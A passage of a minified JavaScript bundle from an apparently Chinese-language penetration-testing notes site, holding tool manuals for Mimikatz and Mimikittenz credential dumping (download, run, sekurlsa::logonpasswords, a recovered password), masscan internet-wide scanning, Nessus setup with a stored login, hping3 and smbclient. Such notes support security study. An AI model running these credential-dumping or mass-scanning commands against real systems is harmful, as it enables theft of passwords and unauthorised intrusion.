              `))},{name:"\u3010Mimikittenz\u3011",desc:r.a.createElement(r.a.Fragment,null),content:r.a.createElement(r.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

              Mimikittenz

                  \u4ECB\u7ECD\uFF1A
                      \u4EE5\u4FBF\u4ECE\u5404\u79CD\u3010\u76EE\u6807\u8FDB\u7A0B\u3011\u4E2D\uFF0C\u63D0\u53D6\u7EAF\u6587\u672C\u5BC6\u7801\u3002
                      \u5229\u7528 Windows \u51FD\u6570 ReadProcessMemory() \u7684\u540E\u5229\u7528 powershell \u5DE5\u5177\u3002

                  Invoke-mimikittenz.ps1

                  \u4E00\u4E9B\u8BE6\u7EC6\u4F7F\u7528\u65B9\u5F0F\uFF1A
                      FireFox\u3001Chrome\u3001IE  \u7B49\u7B49

              `))},{name:"\u3010MimiKatz\u3011 / \u3010MimiKatz.exe\u3011 / \u3010\u7315\u7334\u6843\u3011",desc:r.a.createElement(r.a.Fragment,null),content:r.a.createElement(r.a.Fragment,null,E.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
                \u4F7F\u7528\u3010mimikatz.exe\u3011
                    \u53C2\u8003\u8D44\u6599\uFF1A
                        \u8D44\u65991\uFF1Ahttps://www.shuzhiduo.com/A/RnJWB8xBzq/
                        \u8D44\u65992\uFF1Ahttps://www.freebuf.com/articles/web/176796.html
                        \u8D44\u65993\uFF1Ahttps://adsecurity.org/?page_id=1821

                    \u4F7F\u7528\u8FC7\u7A0B\uFF1A

                        1.\u4E0B\u8F7D\u547D\u4EE4\u3010cd ~/Downloads && wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.7z\u3011
                            1.\u8FD9\u91CC\uFF0C\u6709\u4E00\u4E2A\u8BEF\u533A\uFF1A\u3010zip\u3011\u548C\u30107z\u3011\u7684\u4E24\u4E2A\u6587\u4EF6\uFF0C\u5185\u5BB9\u7ADF\u7136\u662F\u4E0D\u4E00\u6837\u7684\uFF01\uFF01\uFF01\u30107z\u3011\u5305\u542Bexe\u6587\u4EF6\uFF0C\u800C\u3010zip\u3011\u4E0D\u5305\u542B\u3002\u6709\u70B9\u5751\u554A\u3002

                        2.\u4E0A\u4F20\u3010mimikatz.exe\u3011

                        3.\u8FD0\u884C\u3010mimikatz.exe\u3011

                            1.\u6267\u884C\u3010sekurlsa::logonpasswords\u3011\uFF0C\u83B7\u5F97\u5BC6\u7801\u8868
                                1.\u3010User Name\u3011\uFF0C\u7CFB\u7EDF\u7528\u6237\u540D\u3002
                                2.\u5BC6\u7801\u5F62\u5F0F\uFF1A
                                    1.\u3010msv\u3011
                                    2.\u3010tspkg\u3011
                                    3.\u3010wdigest\u3011
                                    4.\u3010kerberos\u3011
                                    5.\u3010ssp\u3011
                                    6.\u3010credman\u3011

                            2.\u5176\u4E2D\u6709\u6548\u7684\uFF1A\u3010sandra/Password1234!\u3011

                        4. 123
                `))}]}]},c=g},OZM5:function(H,d,n){"use strict";n.d(d,"b",function(){return F}),n.d(d,"a",function(){return p}),n.d(d,"j",function(){return I}),n.d(d,"g",function(){return g}),n.d(d,"h",function(){return c}),n.d(d,"f",function(){return h}),n.d(d,"c",function(){return B}),n.d(d,"d",function(){return O}),n.d(d,"i",function(){return y}),n.d(d,"e",function(){return j});var S=n("KQm4"),t=n("U8pU"),l=n("Ff2n"),r=n("q1tI"),e=n.n(r),u=n("Kwbf"),m=n("WaYH"),E=["children"];function F(v,x){if(!v)return[];var T=v.slice(),R=T.indexOf(x);return R>=0&&T.splice(R,1),T}function p(v,x){var T=(v||[]).slice();return T.indexOf(x)===-1&&T.push(x),T}function I(v){return v.split("-")}function g(v,x){return"".concat(v,"-").concat(x)}function c(v){return v&&v.type&&v.type.isTreeNode}function h(v,x){var T=[],R=x[v];function s(){var o=arguments.length>0&&arguments[0]!==void 0?arguments[0]:[];o.forEach(function(i){var f=i.key,P=i.children;T.push(f),s(P)})}return s(R.children),T}function w(v){if(v.parent){var x=I(v.pos);return Number(x[x.length-1])===v.parent.children.length-1}return!1}function a(v){var x=I(v.pos);return Number(x[x.length-1])===0}function B(v,x,T,R,s,o,i,f,P,D){var C,M=v.clientX,L=v.clientY,J=v.target.getBoundingClientRect(),q=J.top,V=J.height,tu=(D==="rtl"?-1:1)*(((s==null?void 0:s.x)||0)-M),Y=(tu-12)/R,au=f[T.props.eventKey];if(L<q+V/2){var hu=i.findIndex(function(gu){return gu.key===au.key}),mu=hu<=0?0:hu-1,Pu=i[mu].key;au=f[Pu]}var qu=au.key,Qu=au,Wu=au.key,U=0,Fu=0;if(!P.includes(qu))for(var ru=0;ru<Y&&w(au);ru+=1)au=au.parent,Fu+=1;var Eu=x.props.data,eu=au.node,su=!0;return a(au)&&au.level===0&&L<q+V/2&&o({dragNode:Eu,dropNode:eu,dropPosition:-1})&&au.key===T.props.eventKey?U=-1:(Qu.children||[]).length&&P.includes(Wu)?o({dragNode:Eu,dropNode:eu,dropPosition:0})?U=0:su=!1:Fu===0?Y>-1.5?o({dragNode:Eu,dropNode:eu,dropPosition:1})?U=1:su=!1:o({dragNode:Eu,dropNode:eu,dropPosition:0})?U=0:o({dragNode:Eu,dropNode:eu,dropPosition:1})?U=1:su=!1:o({dragNode:Eu,dropNode:eu,dropPosition:1})?U=1:su=!1,{dropPosition:U,dropLevelOffset:Fu,dropTargetKey:au.key,dropTargetPos:au.pos,dragOverNodeKey:Wu,dropContainerKey:U===0?null:((C=au.parent)===null||C===void 0?void 0:C.key)||null,dropAllowed:su}}function O(v,x){if(!!v){var T=x.multiple;return T?v.slice():v.length?[v[0]]:v}}var _=function(x){return x};function b(v,x){if(!v)return[];var T=x||{},R=T.processProps,s=R===void 0?_:R,o=Array.isArray(v)?v:[v];return o.map(function(i){var f=i.children,P=Object(l.a)(i,E),D=b(f,x);return e.a.createElement(m.a,s(P),D)})}function y(v){if(!v)return null;var x;if(Array.isArray(v))x={checkedKeys:v,halfCheckedKeys:void 0};else if(Object(t.a)(v)==="object")x={checkedKeys:v.checked||void 0,halfCheckedKeys:v.halfChecked||void 0};else return Object(u.a)(!1,"`checkedKeys` is not an array or an object"),null;return x}function j(v,x){var T=new Set;function R(s){if(!T.has(s)){var o=x[s];if(!!o){T.add(s);var i=o.parent,f=o.node;f.disabled||i&&R(i.key)}}}return(v||[]).forEach(function(s){R(s)}),Object(S.a)(T)}},PlTX:function(H,d,n){"use strict";n.d(d,"b",function(){return s0});var S=n("fWQN"),t=n("qqnG"),l=n("oBTY"),r=n("q1tI"),e=n.n(r),u=n("/qoP"),m=n("vhfr"),E=n("nMEn"),F=n("jJ7j"),p={name:"\u3010NetDiscover\u3011_\u624B\u518C",desc:e.a.createElement(e.a.Fragment,null,"\u53D1\u73B0\u8303\u56F4\u5185\u7684\u6D3B\u8DC3\u4E3B\u673A"),steps:[{name:"\u57FA\u672C\u4F7F\u7528",content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E("netdiscover \uFF08\u6CA1\u6709\u5176\u5B83\u53C2\u6570\uFF09","	1.\u81EA\u52A8\u8FDB\u884C\u626B\u63CF","	2.\u529F\u80FD\u76F8\u5BF9\u8F83\u5F31","netdiscover -r <IP\u5730\u5740\u3001IP\u7F51\u6BB5>","	1.\u6307\u5B9A\u8303\u56F4\u626B\u63CF","	\u3010-r\u3011 \u6307\u5B9A\u4E00\u4E2A\u8303\u56F4","\u901F\u5EA6\uFF1A","	1.\u5C31\u3010\u53D1\u73B0\u6D3B\u8DC3\u4E3B\u673A\u3011\u7684\u901F\u5EA6\u800C\u8A00\uFF0C\u6BD4\u3010masscan\u3011\u8FD8\u8981\u5FEB\u5F88\u591A\u3002"," "))}]},I=p,g=n("ysNt"),c=g.l.singleATag_blank,h={name:"\u3010MasScan\u3011_\u624B\u518C",steps:[{name:"\u57FA\u672C\u4F7F\u7528",content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`


            \u547D\u4EE4
                masscan  <IP\u5730\u5740\u3001IP\u7F51\u6BB5>  -p<\u5F00\u59CB\u7AEF\u53E3>-<\u7ED3\u675F\u7AEF\u53E3>  -sS  -Pn  -n  --randomize-hosts
                    IP\u5730\u5740\uFF0C\u53EF\u4EE5\u7528\u5355\u4E2AIP\uFF0C\u4E5F\u53EF\u4EE5\u7528IP\u7F51\u6BB5
                    \u3010-p\u7AEF\u53E3\u3011\u53EF\u4EE5\u5355\u4E2A\u7AEF\u53E3\uFF0C\u4E5F\u53EF\u4EE5\u7AEF\u53E3\u8303\u56F4 \uFF08\u8303\u56F4\u4E2D\u95F4\u7528 -\u6A2A\u6760 \u8FDE\u63A5\uFF09
                    \u5176\u5B83\u9009\u9879\uFF0C\u548C nmap \u57FA\u672C\u5DEE\u4E0D\u591A
            `,e.a.createElement(e.a.Fragment,null,"\u6D4B\u901F\uFF1A \uFF08",c("\u94FE\u63A5","https://zhuanlan.zhihu.com/p/323726126"),"\uFF09"),`
                1.\u4E00\u822C\u80FD\u8FBE\u5230\u7684\u6781\u901F\uFF1A
                    \u30101-kpps\u3011\uFF0C\u6307\u3010\u6BCF\u79D21000\u4E2A\u7AEF\u53E3\u3011\u3002
                    \u5C40\u57DF\u7F51\uFF1A93-kpps\u5DE6\u53F3\u3002
                2.\u3010\u5047\u8DEF\u7531mac\u5730\u5740\u3011\uFF0C\u4EE5\u672C\u5730\u6D4B\u901F
                    masscan 0.0.0.0/4 -p80 --rate 100000000 --router-mac 66-55-44-33-22-11
                3.\u3010offline\u6A21\u5F0F\u3011\uFF0C\u6D4B\u901F
                    masscan 0.0.0.0/4 -p80 --rate 100000000 --offline

            \u52A0\u901F\uFF1A
                \u3010--rate <\u6570\u5B57>\u3011 \u8BBE\u7F6E\u901F\u7387
                \u3010--max-rate <\u6570\u5B57>\u3011 \u6700\u5927\u901F\u7387\uFF1F\uFF1F\uFF1F

            \u626B\u63CF\u6574\u4E2A\u4E92\u8054\u7F51\uFF1A
                masscan 0.0.0.0/0 -p0-65535

            \u6210\u529F\u4F8B\u5B50\uFF1A
                IP\u7F51\u6BB5\u3010192.168.81.1/30\u3011 + \u7AEF\u53E3\u301012000-20500\u3011\uFF0C\u5171\u67094\u4E2A\u7ED3\u679C

            `,e.a.createElement(e.a.Fragment,null,"\u5176\u5B83\u5E38\u7528\u9009\u9879\uFF1A \uFF08",c("\u53EF\u67E5\u8BE2\u8D44\u65991","http://manpages.ubuntu.com/manpages/bionic/man8/masscan.8.html"),"\uFF09"),`
                \u3010-e  <\u7F51\u7EDC\u63A5\u53E3\u540D>\u3011\uFF0C\u641C\u7D22\u7279\u5B9A\u7F51\u7EDC\u7AEF\u53E3
                    \u6307\u5B9A\u7F51\u7EDC\u8BBE\u5907\uFF0C\u6BD4\u5982\u4E00\u4E2A\u7F51\u5361 tun0 \u3002
            `))}]},w=h,a={name:"\u3010Nikto\u3011_\u624B\u518C",steps:[{name:"\u5DF2\u7ECF\u8FC7\u65F6",content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E("nikto -o <\u8F93\u51FA\u6587\u4EF6> -h <IP\u5730\u5740> -p 80 ","	\u662F\u6BD4\u8F83\u843D\u540E\u7684\u626B\u63CF\u5668\uFF0C\u7ED3\u679C\u4E5F\u4E0D\u591F\u7CBE\u786E"))}]},B=a,O=g.l.singleATag_blank,_={name:"\u3010Nessus\u3011_\u624B\u518C",steps:[{name:"\u5927\u81F4",content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E("systemctl","	systemctl start nessusd","		\u7528\u4E8E\u542F\u52A8\u670D\u52A1",'	firefox  -new-tab  "https://localhost:8834"  ',"		\u6253\u5F00\u63A7\u5236\u53F0\u7F51\u9875",e.a.createElement(e.a.Fragment,null,"\u51ED\u8BC1\u83B7\u53D6\uFF1A\uFF08",O("\u6D41\u7A0B\u7684\u4E00\u4E9B\u7B80\u4ECB","https://my.oschina.net/u/4518087/blog/4727400"),"\u3001",O("\u7EDF\u4E00\u6CE8\u518C\u9875\u9762","https://www.tenable.com/products/nessus/activation-code#nessus"),"\u3001",O("\u5907\u7528\u4E13\u4E1A\u7248\u6CE8\u518C\u9875\u9762","https://zh-cn.tenable.com/products/nessus/nessus-professional/evaluate"),"\uFF09"),"	\u57FA\u7840\u7248","		\u7528\u3010outlook\u90AE\u7BB1\u3011\u6CE8\u518C\u8D26\u53F7","	","	\u4E13\u4E1A\u7248","		\u7528\u3010foxmail\u90AE\u7BB1\u3011\u6CE8\u518C\u8D26\u53F7\uFF0C\u5927\u698210\u5206\u949F\u5DE6\u53F3\uFF0C\u4F1A\u6536\u5230",e.a.createElement(e.a.Fragment,null,"	","\u5E8F\u5217\u53F7\u4F7F\u7528\uFF1A",O("\u6307\u4EE4\u8BF4\u660E","https://docs.tenable.com/nessus/Content/UpdateActivationCode.htm")),"		\u6267\u884C\u3010/opt/nessus/sbin/nessuscli fetch --register <\u5E8F\u5217\u53F7xxxx-xxxx-xxxx-xxxx>\u3011","			\u7136\u540E\uFF0C\u4F1A\u81EA\u52A8\u66F4\u65B0\u3010\u4E13\u4E1A\u7248\u63D2\u4EF6\u3011\u548C\u3010\u4E13\u4E1A\u7248\u7EC4\u4EF6\u3011","		\u672C\u5730\u6CE8\u518C\u8D26\u53F7\uFF08\u597D\u50CFlicense\u8D26\u53F7\u4E0A\u9650\u6709\u9650\u5236\uFF09",e.a.createElement(e.a.Fragment,null,"\u672C\u5730\u8D26\u53F7\u7BA1\u7406\uFF1A\uFF08",O("\u4E00\u4E9B\u64CD\u4F5C","https://www.jianshu.com/p/f55e0f62257a"),"\u3001",O("\u4E00\u4E9B\u6307\u4EE4","https://docs.tenable.com/nessus/Content/NessusCLI.htm"),"\uFF09"),"	\u8D26\u53F7\uFF1A\u3010hanshou101\u3011+\u3010123456\u3011","	\u8FDB\u5165\u6839\u76EE\u5F55 cd /opt/nessus/sbin","	./nessuscli \uFF08\u57FA\u672C\u521D\u59CB\u5316\uFF09","	./nessuscli lsuser \uFF08\u5217\u51FA\u73B0\u6709\u7528\u6237\uFF09","	./nessuscli adduser \uFF08\u65B0\u589E\u7528\u6237\uFF09","	./nessuscli rmuser \uFF08\u5220\u9664\u7528\u6237\uFF09","	./nessuscli chpasswd <\u7528\u6237\u540D> \uFF08\u4FEE\u6539\u7528\u6237\u5BC6\u7801\uFF09","\u57FA\u672C\u64CD\u4F5C\uFF1A","	1.\u7B2C\u4E00\u6B21\u8FDB\u6765\uFF0C\u6DFB\u52A0\u57FA\u672C\u3010IP\u3001\u57DF\u540D\u3011","	2.\u3010My Host Discovery Scan\u3011\u6839\u636E \u4E3B\u673A\u57FA\u672C\u53D1\u73B0\u63A2\u7D22\u7ED3\u679C\uFF0C\u52FE\u9009\u8FDB\u884C\u626B\u63CF","	3.\u3010My Basic Network Scan\u3011\uFF0C\u81EA\u52A8\u8FDB\u5165\u626B\u63CF"))}]},b=_,y=n("tJVT"),j=g.l.singleATag_blank,v=g.l.tutorial.descLinks,x={name:"\u3010Ping\u7C7B\u3011_\u3010IPv6\u3011_\u624B\u518C",steps:[{name:"\u3010ping\u3011\u3001\u3010\u7C7Bping\u3011",steps:[{name:"\u3010ping\u3011",desc:e.a.createElement(e.a.Fragment,null,"\uFF08Windows\u3001Linux\u901A\u7528\uFF0C\u529F\u80FD\u76F8\u5BF9\u8F83\u5F31\uFF09"),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E("ping \uFF08Windows\u3001Linux\u901A\u7528\uFF0C\u529F\u80FD\u76F8\u5BF9\u8F83\u5F31\uFF09","	ping <\u57DF\u540D\u3001IP>"," "))},{name:"\u3010hping3\u3011 \uFF08\u529F\u80FD\u66F4\u5F3A\u7248\u7684ping\uFF09",desc:e.a.createElement(e.a.Fragment,null,"hping3 \uFF08\u529F\u80FD\u66F4\u5F3A\u7248\u7684ping\uFF09"),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E("hping3 \uFF08\u529F\u80FD\u66F4\u5F3A\u7248\u7684ping\uFF09","	hping3 -p 80 -c 30 -S  <\u57DF\u540D\u3001IP>","		\u3010-S\u3011\uFF0C\u4F7F\u7528\u3010SYN\u6807\u8BC6\u96C6\u3011\u4EE5\u53D1\u9001 \u7C7Bping\u547D\u4EE4","		\u3010-p\u3011\uFF0C\u53D1\u9001\u523080\u7AEF\u53E3 \uFF0880\u7AEF\u53E3\u7684\u5408\u6CD5\u8BF7\u6C42\uFF0C\u5F88\u5C11\u88AB\u670D\u52A1\u5668\u963B\u585E\uFF09","		\u3010-c\u3011\u53D1\u5305\u6B21\u6570"))},{name:"nmap\u7684\u3010-sn\u3011\u9009\u9879",desc:e.a.createElement(e.a.Fragment,null),content:Promise.all([Promise.resolve().then(n.bind(null,"nMEn"))]).then(function(Xu){var $u=Object(y.a)(Xu,1),ne=$u[0];return e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(Object(u.d)({\u667A\u80FD\u6B65\u9AA4_cfg:ne.Nmap_\u624B\u518C})))})}]},{name:"\u3010IPv6\u3011",steps:[{name:"\u3010atk6-alive6\u3011",desc:e.a.createElement(e.a.Fragment,null,"\uFF08\u83B7\u53D6\u672C\u673A \u540C\u4E00\u6BB5\u4E2D\u7684\u6D3B\u8DC3\u5730\u5740\uFF0C\u597D\u50CF\u65E0\u6CD5\u67E5\u627E\u8FDC\u7A0B\uFF09"),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E("atk6-alive6 \uFF08\u83B7\u53D6\u672C\u673A \u540C\u4E00\u6BB5\u4E2D\u7684\u6D3B\u8DC3\u5730\u5740\uFF0C\u597D\u50CF\u65E0\u6CD5\u67E5\u627E\u8FDC\u7A0B\uFF09","	atk6-alive6 <\u8BBE\u5907\u540D\uFF0C\u5982eth0\u3001lo>"))},{name:"\u4F7F\u7528 \u3010metasploit\u3011 / \u3010msf\u3011 \u53D1\u73B0IPv6\u7684\u8BA1\u7B97\u673A",desc:e.a.createElement(e.a.Fragment,null),content:Promise.resolve().then(n.bind(null,"eFOt")).then(function(Xu){return e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(Object(u.d)({\u667A\u80FD\u6B65\u9AA4_cfg:Xu.ExploitDB_SearchSploit_MetaSploit_MSF_\u624B\u518C})))})}]},{name:"\u300A\u5728\u7EBF\u7F51\u7AD9\u300B\u2014\u2014\u3010\u771F\u5B9EIP\u3011\u67E5\u8BE2\u3001\u3010\u6D4B\u901F\u3011",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E.apply(F.a,Object(l.a)(v([{href:"https://www.17ce.com/",name:"\u56FD\u5185\u5168\u56FD\u6D4B\u901F 17CE.COM | \u652F\u6301GET\u3001Ping\u3001DNS\u3001CDN\u3001\u8DEF\u7531\u8FFD\u8E2A",rate:"\u4E2D\u4EF7\u503C\uFF0C\u56FD\u5185\u5404\u8282\u70B9\u6D4B\u901F\uFF0C\u652F\u6301\u8DF3\u8F6C\u8FFD\u8E2A"},{href:"http://dns.bugscaner.com/",name:"\u540CIP\u7F51\u7AD9\u67E5\u8BE2 - IP\u53CD\u67E5\u57DF\u540D - CMS\u7C7B\u578B\u63A2\u6D4B",rate:"\u4E2D\u4EF7\u503C\uFF0C\u80FD\u591F\u67E5\u5230\u3002\u4F46\u4FE1\u606F\u6BD4\u8F83\u7B80\u7565"},{href:"https://asm.ca.com/en/ping.php",name:"\u56FD\u5916\u5168\u7403\u8282\u70B9\uFF0C\u6D4B\u901F\u7F51\u7AD9 \u2014\u2014 \u4F3C\u4E4E\u5DF2\u4E1A\u52A1\u8F6C\u578B\uFF0C\u4E0D\u518D\u63D0\u4F9B\u670D\u52A1",rate:"\u73B0\u4E3A0\u4EF7\u503C\uFF0C\u539F\u4E3A\u9AD8\u4EF7\u503C\u3002\u9700\u8981\u6CE8\u518C\uFF1B\u4F7F\u7528\u865A\u5047\u8EAB\u4EFD\u6CE8\u518C\u8BD5\u7528\u540E\uFF0C\u53D1\u73B0\u5DF2\u4E1A\u52A1\u8F6C\u578B\uFF0C\u4E0D\u518D\u63D0\u4F9B\u300A\u5168\u7403\u8282\u70B9\u81EA\u7531\u6D4B\u901F\u300B\u670D\u52A1",opt:{outdated:!0}}]))))},{name:"\u3010IP\u8DF3\u8F6C\u3011\u3001\u3010\u8DEF\u7531\u3011\u3001\u3010\u8DEF\u7531\u8BCA\u65AD\u3011\u3001\u3010\u7F51\u7EDC\u62D3\u6251\u3011\u3001",steps:[{name:"\u3010traceroute\u3011",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E("traceroute","	traceroute -I -m 255  <\u57DF\u540D\u3001IP\u5730\u5740>","		\u3010-I\u3011\uFF0C\u4F7F\u7528ICMP\u62A5\u6587\u53D1\u9001\u3002  \uFF08\u89E3\u51B3 Linux\u865A\u62DF\u673A\uFF0C\u5168\u662F\u661F\u53F7 \u7684\u95EE\u9898\uFF09","		\u3010-m\u3011\u8BBE\u7F6E\u6700\u5927\u7684\u3010hop\u8DF3\u3011\u6570","	\u6210\u529F\u4F8B\u5B50\uFF1A","		\u3010zhihu.com\u3011\u3001\u3010baidu.com\u3011",e.a.createElement(e.a.Fragment,null,"	","(",j("\u66F4\u591A\u7528\u6CD5\u4E86\u89E3","https://www.cnblogs.com/peida/archive/2013/03/07/2947326.html"),")")," "))},{name:"\u3010tracert\u3011",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E("tracert \uFF08Windows\u4E0B\u6307\u4EE4\uFF0C\u5F88\u591A\u65F6\u5019\u6BD4\u3010traceroute\u3011\u66F4\u597D\u7528\uFF09","	tracert -h 255 -w 10000 <\u57DF\u540D\u3001IP\u5730\u5740>","		\u3010-h\u3011\u8BBE\u7F6E\u6700\u5927\u7684\u3010hop\u8DF3\u3011\u6570","		\u3010-w\u3011\u8BBE\u7F6E\u7B49\u5F85\u7684\u8D85\u65F6\u65F6\u95F4\u3002\uFF08\u4EE5\u6BEB\u79D2\u4E3A\u5355\u4F4D\uFF0C\u9ED8\u8BA4\u4E3A5\u79D2\uFF09","	\u6210\u529F\u4F8B\u5B50\uFF1A","		\u3010zhihu.com\u301118\u8DF3\u5DE6\u53F3\u3001\u3010baidu.com\u301119\u8DF3\u5DE6\u53F3"))},{name:"\u300A\u5728\u7EBF\u7F51\u7AD9\u300B\u2014\u2014\u3010\u8DEF\u7531\u8BCA\u65AD\u3011\u7ED8\u5236IP\u8DF3\u8F6C\u8DEF\u5F84\u3001\u5916\u90E8\u7F51\u7EDC\u62D3\u6251\u7ED3\u6784\u3001\u53D1\u73B0\u3010\u9632\u706B\u5899\u3011\u8FC7\u6EE4\u5668",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E.apply(F.a,Object(l.a)(v([{href:"http://www.traceroute.org/",name:"\u5168\u7403\u5404\u5730TraceRoute\u7F51\u7AD9\u6536\u5F55 - \u5DF2\u8FC7\u65F6",rate:"\u65E0\u4EF7\u503C\u3002\u672C\u6765\u662F\u9AD8\u4EF7\u503C\uFF0C\u4F46\u90FD\u5DF2\u8FC7\u65F6\u4E86",opt:{outdated:!0}}]))))}]}]},T=x,R=n("B5J2"),s=g.l.singleATag_blank,o=g.l.tutorial.descLinks,i={name:"\u672A\u77E5\u3010\u7AEF\u53E3\u3011_\u5E38\u7528\u3010\u7AEF\u53E3\u3011_\u3010\u7AEF\u53E3\u3011\u67E5\u8BE2_\u624B\u518C",steps:[{name:"\u300A\u5728\u7EBF\u7F51\u7AD9\u300B\u2014\u2014\u5E38\u89C1\u7684\u5F00\u653E\u3010\u7AEF\u53E3\u3011\u6C47\u603B\u4FE1\u606F\u4E00\u89C8",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E.apply(F.a,Object(l.a)(o([{href:"https://www.iana.org/assignments/service-names-port-numbers/service-names-port-numbers.xml",name:"\u56FD\u9645 \u5DF2\u6CE8\u518C\u7684\u670D\u52A1\u548C\u7AEF\u53E3\u540D\uFF0C\u6C47\u603B",rate:"\u9AD8\u4EF7\u503C"}]))))}]},f=i,P=n("SeyV"),D=g.l.singleATag_blank,C={name:"\u3010SMB\u3011_\u624B\u518C",steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",desc:e.a.createElement(e.a.Fragment,null),content:e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u7AEF\u53E3
              139
                  netbios-ssn

                  NetBIOS \u662F\u7F51\u7EDC\u57FA\u672C\u8F93\u5165/\u8F93\u51FA\u7CFB\u7EDF\u7684\u9996\u5B57\u6BCD\u7F29\u5199
                      Network Basic Input/Output System

                      \u4E00\u79CD\u5141\u8BB8\u5728\u5C40\u57DF\u7F51\u4E2D\u901A\u8FC7 OSI \u6A21\u578B\u7684\u4F1A\u8BDD\u5C42\u8FDB\u884C\u300A\u6587\u4EF6\u300B\u548C\u300A\u6253\u5370\u673A\u901A\u4FE1\u300B\u7684\u534F\u8BAE

              445
                  microsoft-ds?

          Server Message Block
              file sharing protocol \u6587\u4EF6\u5206\u4EAB\u534F\u8BAE


          Samba\uFF0C\u662F\u300Asmb\u534F\u8BAE\u300B\u7684\u5177\u4F53\u5B9E\u73B0\u4EA7\u54C1


          \u6743\u9650\uFF1A
              \u4E0D\u540C\u7684\u3010Share\u5206\u4EAB\u3011\uFF0C\u5BF9\u5E94\u7740\u4E0D\u540C\u7684\u3010\u7528\u6237\u6743\u9650\u3011

              \u54EA\u6015\uFF0C\u540C\u4E00\u4E2A\u3010Share\u5206\u4EAB\u3011
                  \u5728\u5176\u4E2D\u7684\u3010\u5B50\u6587\u4EF6\u5939\u3011\uFF0C\u4E5F\u5BF9\u5E94\u7740\u4E0D\u540C\u7684\u3010\u7528\u6237\u6743\u9650\u3011
                  \u6BCF\u4E2A\u7528\u6237\uFF0C\u770B\u5230\u7684\u3010\u76EE\u5F55\u5185\u5BB9\u3011\uFF0C\u4E5F\u4F1A\u4E0D\u4E00\u6837\u7684

              \u3010\u5217\u4E3E\u76EE\u5F55\u3011\u548C\u3010\u67E5\u770B\u6587\u4EF6\u3011\uFF0C\u4E0D\u662F\u540C\u4E00\u4E2A\u6743\u9650\u3002

              \u6709\u7684\u3010\u7236\u6587\u4EF6\u5939\u3011\u4E0D\u5141\u8BB8\u3010\u5217\u4E3E\u3011\uFF1B\u4F46\u7236\u4E4B\u4E0B\u7684\u3010\u5B50\u6587\u4EF6\u5939\u3011\u53C8\u5141\u8BB8\u3010\u5217\u4E3E\u3011\u3002

          `))},{name:"\u3010smbclient\u3011       \uFF08Linux\u5DE5\u5177\uFF09",desc:e.a.createElement(e.a.Fragment,null),content:Promise.all([Promise.resolve().then(n.bind(null,"SeyV"))]).then(function(Xu){var $u=Object(y.a)(Xu,1),ne=$u[0];return e.a.createElement(e.a.Fragment,null,F.a.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`
          \u53C2\u8003\u8D44\u6599\uFF1Ahttps://linuxtect.com/linux-smbclient-command-tutorial/

          \u767B\u5F55
              smbclient  -L  <IP\u5730\u5740>
                  \u5217\u51FA\u300A\u76EE\u6807\u673A\u5668\u300B\uFF0C\u6240\u63D0\u4F9B\u7684\u5171\u4EAB

                      \u300A\u672B\u5C3E\u5E26$\u300B\uFF0C\u662F\u7CFB\u7EDF\u5185\u7F6E \u6216 \u9ED8\u8BA4\u7684share\u3002
                      \u300A\u4E0D\u5E26$\u300B\uFF0C\u5C31\u662F \u81EA\u5B9A\u4E49 \u7684share\u3002

                  \u5982\u679C\u63D0\u793A\u3010NT_STATUS_ACCESS_DENIED\u3011
                      \u5219\u53EF\u80FD\u9700\u8981\u300A-U\u300B\u5E26\u7528\u6237\uFF0C\u6765\u8FDB\u884C\u3010\u5217\u4E3E\u3011\u3002

              smbclient  "\\<IP\u5730\u5740><Share\u5BB9\u5668>"
                  \u5173\u4E8E\u300A\\\u300B\u7684\u4E2A\u6570
                      \u548C\u300A\u5177\u4F53\u64CD\u4F5C\u7CFB\u7EDF\u300B\u5E94\u8BE5\u662F\u6709\u5173\u7684\uFF0C\u5E73\u53F0\u5DEE\u5F02
                          Windows\u3001Linux\u3002
                      \u300A\\\u300B\u5982\u679C\u4E0D\u591F\uFF0C\u5C31\u7528\u300A\\\\\u300B
                          \u5230\u65F6\u5019\uFF0C\u547D\u4EE4\u884C\u4F1A\u6709\u63D0\u793A\u3002

                  \u7B2C\u4E00\u79CD\uFF0C\u76F4\u63A5\u767B\u5F55

